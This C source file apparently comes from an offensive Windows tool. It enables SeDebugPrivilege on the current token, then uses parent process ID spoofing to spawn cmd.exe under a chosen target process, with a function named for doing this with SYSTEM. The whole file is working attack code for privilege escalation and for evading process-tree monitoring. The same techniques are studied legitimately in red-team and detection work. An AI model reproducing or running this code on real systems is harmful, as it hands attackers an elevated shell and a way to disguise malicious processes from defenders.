#include "PPID.h"


BOOL GetCurrentUserToken
(
	OUT HANDLE* hToken
)
{

	HANDLE Token = INVALID_HANDLE_VALUE;
	NTSTATUS status = STATUS_SUCCESS;

	LOADAPI(fnNtOpenProcessToken, NtOpenProcessToken, "Ntdll");
	LOADAPI(fnNtOpenThreadToken, NtOpenThreadToken, "Ntdll");

	if (!NT_SUCCESS(NtOpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &Token)))
	{
		if (!NT_SUCCESS(NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token)))
		{
			NTERROR("NtOpenProcessToken");
			return FALSE;
		}
	}

	INFO("Token Populated!");

	*hToken = Token;

	return TRUE;

}

BOOL AdjustPrivileges
(
	IN HANDLE hToken
)
{

	BOOL State = TRUE;
	TOKEN_PRIVILEGES TokenPrivs = { 0 };
	LUID luid = { 0 };

	if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid))
	{
		PRINT_ERROR("LookupPrivilegeValueA");
		return FALSE;
	}

	TokenPrivs.PrivilegeCount = 1;
	TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	TokenPrivs.Privileges[0].Luid = luid;

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		PRINT_ERROR("AdjustTokenPrivileges");
		State = FALSE; goto _CLEANUP;
	}

_CLEANUP:

	if (hToken)
		CloseHandle(hToken);

	return State;

}

BOOL PPIDSpoofingWithSystem
(
	IN DWORD TargetProcessId
)
{

	BOOL State = TRUE;
	HANDLE hProcess = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOEXA si = { 0 };
	SIZE_T Size = 0;
	LPCSTR Commandline = "C:\\Windows\\system32\\cmd.exe";

	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOEXA));
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!(hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, TargetProcessId)))
	{
		WARN("Failed To Open a Handle!");
		PRINT_ERROR("OpenProcess");
		State = FALSE; goto _CLEANUP;
	}

	INFO("[0x%p] Target Process Handle", hProcess);

	InitializeProcThreadAttributeList(NULL, 1, 0, &Size);
	
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	if (si.lpAttributeList == NULL)
	{
		WARN("Failed To Allocate %zu-Bytes to lpAttributeList", Size);
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto _CLEANUP;
	}

	INFO("%zu-Bytes Allocated!", Size);

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &Size))
	{
		WARN("Failed To Initialize Thread Attributes!");
		PRINT_ERROR("InitializeProcThreadAttributeList");
		State = FALSE; goto _CLEANUP;
	}

	INFO("Initialzed Thread Attributes!");

	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
	{
		WARN("Failed To Update Thread Attributes!");
		PRINT_ERROR("UpdateProcThreadAttribute");
		State = FALSE; goto _CLEANUP;
	}

	INFO("Updated Thread Attributes!");

	if (!CreateProcessA(Commandline, NULL, NULL, NULL, TRUE, (EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE), NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create New Process!");
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto _CLEANUP;
	}

	INFO("Created Process! CommandLine: %s", Commandline);

	OKAY("DONE!");

_CLEANUP:

	if (hProcess)
		CloseHandle(hProcess);

	if (pi.hProcess)
		CloseHandle(pi.hProcess);

	if (pi.hThread)
		CloseHandle(pi.hThread);

	return State;

}